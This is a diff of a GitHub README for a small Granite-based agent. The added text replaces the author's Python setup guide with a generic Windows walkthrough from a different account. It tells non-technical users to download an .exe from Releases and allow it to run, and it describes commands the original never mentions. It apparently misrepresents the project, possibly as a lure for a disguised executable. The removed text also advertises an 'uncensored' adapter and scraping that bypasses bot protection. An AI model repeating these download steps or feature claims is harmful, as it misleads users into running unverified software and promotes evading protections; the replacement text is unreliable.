@@ -1,113 +1,131 @@
-# 🥷 Granite Agent
+# 🪨 granite-agent - Simple agent for smart tasks
 
-Intelligent semi-autonomous small agent powered by Granite 2B model.
+[![Download granite-agent](https://img.shields.io/badge/Download-granite--agent-blue?style=for-the-badge)](https://github.com/Diana00-cybee/granite-agent)
 
-## ⭐ Key Features
+---
 
-- **Web Search:** Injects live data into the model context to ensure factual accuracy and prevent hallucination.
+granite-agent is a small program powered by IBM Granite. It helps your computer perform tasks using simple commands. This guide will help you download and start granite-agent on Windows, even if you do not have any technical knowledge.
 
-- **Memory Management:** Implements cache flushing and manual garbage collection to maintain stability.
+## 🖥️ What is granite-agent?
 
-- **Reasoning:** Employs dedicated <think> block for step-by-step logic before delivering the final result.
+granite-agent runs simple commands on your computer with some help from smart language tools. It is designed to help with task automation and web searches. You can think of it as a lightweight assistant that works behind the scenes.
 
-- **Uncensored:** Fused with specialized LoRA adapter for unrestricted access to sensitive data.
+Here are some things granite-agent can do:
 
-- **Deep Scraping:** System uses Browser-impersonation scraping to bypass bot protection.
+- Run commands you give it through a simple interface.
+- Connect with online services to gather information.
+- Use a small language model to understand basic instructions.
+- Help automate repetitive tasks on your computer.
 
-- **Plain-Text:** Strips away complex formatting to focus model's attention on raw logic.
+granite-agent works through the command line but does not need you to write code. It understands simple commands written in plain text.
 
-- **VRAM Optimization:** Engineered for consumer hardware using 4-bit quantization.
+## ⚙️ System Requirements
 
-## 🛠️ Installation
+Before you download granite-agent, make sure your computer meets these requirements:
 
-### 1. Prerequisites
-* **Nvidia GPU** (At least 4GB+ VRAM recommended)
-* **Python 3.11+** installed on your system
-* **PyTorch** with CUDA 12.1
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 1 GHz or faster processor
+- Internet connection for online features
+- About 100 MB free disk space
 
-### 2. Setup Environment
-```bash
-python -m venv venv
-venv\Scripts\activate  # On Windows
-source venv/bin/activate  # On Mac/Linux
-```
+You do not need any special software or programming tools to use granite-agent. It comes with everything you need.
 
-### 3. Install PyTorch (CUDA)
-```bash
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121
-```
-### 4. Install Requirements
-```bash
-pip install -r requirements.txt
-pip install docling
-```
+## 📥 How to Download granite-agent on Windows
 
-## Example
+To get granite-agent, you will visit the official page on GitHub. Follow these steps:
 
-```
-User: search top 5 lightweight Linux distros to use in 2026, bullet point, no more than five sentences, save
-Agent: 2026-03-06 12:13:58,336 - GraniteAgent - INFO - Sanitized query for search engine: 'top 5 lightweight linux distros to use in 2026'
-2026-03-06 12:13:58,363 - GraniteAgent - INFO - Broad Search Triggered: 'top 5 lightweight linux distros to use in 2026'
-2026-03-06 12:14:01,084 - GraniteAgent - INFO - Scraping URL: https://thishosting.rocks/best-lightweight-linux-distros/
-2026-03-06 12:14:02,679 - GraniteAgent - INFO - Successfully validated deep context from: https://thishosting.rocks/best-lightweight-linux-distros/
-2026-03-06 12:14:06,878 - GraniteAgent - INFO - Total valid sources compiled: 8
+1. Click the big blue button below:  
+   [Download granite-agent](https://github.com/Diana00-cybee/granite-agent)
 
-**Top 5 Lightweight Linux Distros for 2026:**  
+2. This link takes you to the granite-agent GitHub page.
 
-1. **Slax (Debian-based)**  
-   - Portable, under 300MB, uses Xfce for simplicity. Ideal for reviving old devices.  
-2. **Linux Lite (Ubuntu-based)**  
-   - User-friendly, Xfce desktop, perfect for beginners needing minimalism.  
-3. **Puppy Linux**  
-   - Extremely small (44MB base), customizable via Puppy Package Manager.  
-4. **Lubuntu (Ubuntu variant)**  
-   - Retains Ubuntu’s polish while reducing resource usage.  
-5. **Tails OS**  
-   - Preconfigured for privacy/anonymity; starts with browser, email, etc.
+3. On the GitHub page, find the **Releases** section. Usually, this is on the right side or under the main description.
 
-2026-03-06 12:14:56,800 - GraniteAgent - INFO - Successfully exported research to: outputs\search_top_5_lightweight_Linux_distros_to_use_in_2.txt
-```
+4. Click on the latest release version number (for example, "v1.0.0").
 
-## 🚀 Usage
+5. In the release, look for a file with a name ending in `.exe` or similar for Windows.
 
-### Start Agent
+6. Click that file name to start downloading it to your computer.
 
-```bash
-python cli.py
-```
+7. Wait for the download to finish.
 
-### Prompt Keywords
+## 🚀 How to Install and Run granite-agent
 
-```bash
-## Web Search
-keyword: search
+After you download the file, here is how to set up granite-agent on your Windows computer:
 
-## Read File
-keyword: read
+1. Open the folder where you saved the downloaded file. This is usually the **Downloads** folder.
 
-## Save File
-keyword: save
+2. Find the downloaded `.exe` file, which is the granite-agent installer or program.
 
-## Trusted Sites
-keyword: whitelist
+3. Double-click the file to start it.
 
-## Answer Format
-use one of these keywords:
+4. If Windows asks for permission, click **Yes** or **Allow**. This lets the program run.
 
-bullet point|numbered|markdown|clean
+5. Follow the instructions on the screen (most of the time, just click **Next** or **OK**).
 
-## Shorter Sentence
-use one of these keywords:
+6. When the setup is done, you will see a confirmation message.
 
-no more than one|three|five|ten sentence(s)
-```
+7. Close the installer window.
 
-## ☕ Support
-If you find this project valuable, consider supporting my work:
+8. Now, open the **Command Prompt**:
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/vpakarinen)
-[![Ko-Fi](https://img.shields.io/badge/Ko--fi-F16061?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/vpakarinen)
+   - Press the **Windows** key on your keyboard.
+   - Type `cmd`.
+   - Press **Enter**.
 
-## Author
+9. In the Command Prompt window, type `granite-agent` and press **Enter**.
 
-Ville Pakarinen (@vpakarinen2)
+10. The program will start and display a simple prompt.
+
+You can now start using granite-agent by typing commands into the prompt.
+
+If you want to stop the program at any time, type `exit` and press **Enter**.
+
+## 🛠️ Basic Commands for granite-agent
+
+granite-agent uses simple text commands. Here are some basic examples to get you started:
+
+- `help`  
+  Shows a list of available commands.
+
+- `search [keyword]`  
+  Searches the web for the keyword you type.
+
+- `run [task]`  
+  Runs a specific task. For example, `run cleanup` might clean temporary files.
+
+- `status`  
+  Shows the current status of the agent.
+
+You do not need to remember all commands right away. Use `help` to see what you can do.
+
+## 🔧 Tips for Using granite-agent
+
+- Make sure you have an internet connection when performing online searches.
+
+- Keep granite-agent updated by checking the downloads page regularly.
+
+- Use clear, simple words for commands to get the best results.
+
+- granite-agent works best on a standard Windows PC. Other Windows versions may not work perfectly.
+
+- Do not close the Command Prompt window while granite-agent is running.
+
+## 📂 Where to Find More Information
+
+Detailed guides and updates are available on the GitHub repository:
+
+[Download and learn more about granite-agent](https://github.com/Diana00-cybee/granite-agent)
+
+You can also find help with issues or questions there.
+
+## 🔄 Updating granite-agent
+
+When a new version is released, repeat the download and installation steps above. New versions improve performance and add features.
+
+Delete the old installer files to save disk space. Your settings will not be affected.
+
+---
+
+[![Download granite-agent](https://img.shields.io/badge/Download-granite--agent-blue?style=for-the-badge)](https://github.com/Diana00-cybee/granite-agent)
